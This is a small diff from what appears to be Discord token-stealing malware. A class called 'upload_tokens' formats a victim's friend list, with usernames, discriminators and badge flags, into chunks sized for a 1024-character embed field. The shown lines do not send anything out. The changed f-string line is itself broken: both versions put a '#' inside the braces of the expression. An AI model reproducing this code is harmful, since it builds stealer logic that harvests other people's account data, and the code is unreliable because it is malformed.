@@ -301,7 +301,7 @@ class upload_tokens:
                         hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                             friend['user']['public_flags'])[::-1]])
 
-                        data = f"```{friend['user']['username'#]}``````{friend['user']['discriminator']}```"
+                        data = f"```{friend['user']['username']#}``````{friend['user']['discriminator']}```"
 
                         if len('\n'.join(hq_friends)) + len(data) >= 1024:
                             break
